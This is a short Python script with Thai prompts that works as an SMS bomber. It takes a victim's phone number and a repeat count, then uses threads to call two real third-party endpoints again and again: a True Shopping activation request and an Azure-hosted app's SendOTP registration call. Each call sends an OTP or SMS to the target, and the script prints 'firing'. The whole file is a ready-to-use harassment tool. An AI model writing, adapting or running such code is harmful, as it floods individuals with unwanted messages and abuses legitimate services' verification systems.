import requests
import os
import time
import threading
from threading import Thread
os.system("clear")
print("")
print("BY:Yuttana Ngonklang")
print("")
phone = input("เบอร์ : ")
num = int(input("จำนวน : "))
print("")

def test(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print("กําลังยิง")
	
def test2():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("กําลังยิง")
	
	
for i in range(num):
	time.sleep(1)
	threading.Thread(target=test).start()
	threading.Thread(target=test2).start()
